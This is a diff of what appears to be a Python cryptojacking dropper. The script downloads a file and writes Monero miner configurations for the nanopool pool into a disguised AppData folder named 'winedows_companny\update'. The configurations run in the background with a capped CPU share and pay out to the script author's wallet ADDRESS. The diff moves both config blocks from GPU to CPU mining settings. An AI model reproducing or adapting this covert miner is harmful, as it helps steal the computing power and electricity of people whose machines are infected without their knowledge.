@@ -668,28 +668,28 @@ if yes == "yes":
     "api": {
         "port": 0,
         "access-token": null,
-        "id": null,
         "worker-id": null,
         "ipv6": false,
         "restricted": true
     },
+    "av": 0,
     "background": true,
     "colors": true,
-    "cuda-bfactor": 12,
-    "cuda-bsleep": 520,
-    "cuda-max-threads": 4,
+    "cpu-affinity": null,
+    "cpu-priority": null,
     "donate-level": 5,
+    "huge-pages": true,
+    "hw-aes": null,
     "log-file": null,
+    "max-cpu-usage": 25,
     "pools": [
         {
             "url": "xmr-eu1.nanopool.org:14444",
-            "user": "''' + ADDRESS + '''",
-            "pass": "x",
-            "rig-id": null,
-            "nicehash": false,
+            "user": "'''+ ADDRESS + '''",
+            "pass": "0xSxZ",
             "keepalive": true,
+            "nicehash": false,
             "variant": -1,
-            "enabled": true,
             "tls": false,
             "tls-fingerprint": null
         }
@@ -697,21 +697,11 @@ if yes == "yes":
     "print-time": 60,
     "retries": 5,
     "retry-pause": 5,
-    "threads": [
-        {
-            "index": 0,
-            "threads": 2,
-            "blocks": 16,
-            "bfactor": 12,
-            "bsleep": 500,
-            "sync_mode": 3,
-            "affine_to_cpu": false
-        }
-    ],
-    "user-agent": null,
+    "safe": false,
     "syslog": false,
-    "watch": true
+    "threads": null
 }
+
 
 
 					''')
@@ -722,44 +712,44 @@ if yes == "yes":
 						print("Writing..")
 						f.write(r.content)
 					open(os.getenv('APPDATA') + "\\winedows_companny\\update\\config.json", "x").write('''
-	{
-		"coin": "monero",
-		"api": {
-			"port": 0,
-			"access-token": null,
-			"worker-id": null,
-			"ipv6": false,
-			"restricted": true
-		},
-		"av": 0,
-		"background": true,
-		"colors": false,
-		"cpu-affinity": null,
-		"cpu-priority": null,
-		"donate-level": 5,
-		"huge-pages": true,
-		"hw-aes": null,
-		"log-file": null,
-		"max-cpu-usage": ''' + MINING_PERCENT +''',
-		"pools": [
-			{
-				"url": "xmr-eu1.nanopool.org:14444",
-				"user": "''' + ADDRESS + '''",
-				"pass": "x",
-				"keepalive": true,
-				"nicehash": false,
-				"variant": -1,
-				"tls": false,
-				"tls-fingerprint": null
-			}
-		],
-		"print-time": 60,
-		"retries": 5,
-		"retry-pause": 5,
-		"safe": false,
-		"syslog": false,
-		"threads": null
-	}
+{
+    "algo": "cryptonight",
+    "api": {
+        "port": 0,
+        "access-token": null,
+        "worker-id": null,
+        "ipv6": false,
+        "restricted": true
+    },
+    "av": 0,
+    "background": true,
+    "colors": true,
+    "cpu-affinity": null,
+    "cpu-priority": null,
+    "donate-level": 5,
+    "huge-pages": true,
+    "hw-aes": null,
+    "log-file": null,
+    "max-cpu-usage": 25,
+    "pools": [
+        {
+            "url": "xmr-eu1.nanopool.org:14444",
+            "user": "'''+ ADDRESS + '''",
+            "pass": "0xSxZ",
+            "keepalive": true,
+            "nicehash": false,
+            "variant": -1,
+            "tls": false,
+            "tls-fingerprint": null
+        }
+    ],
+    "print-time": 60,
+    "retries": 5,
+    "retry-pause": 5,
+    "safe": false,
+    "syslog": false,
+    "threads": null
+}
 
 
 					''')
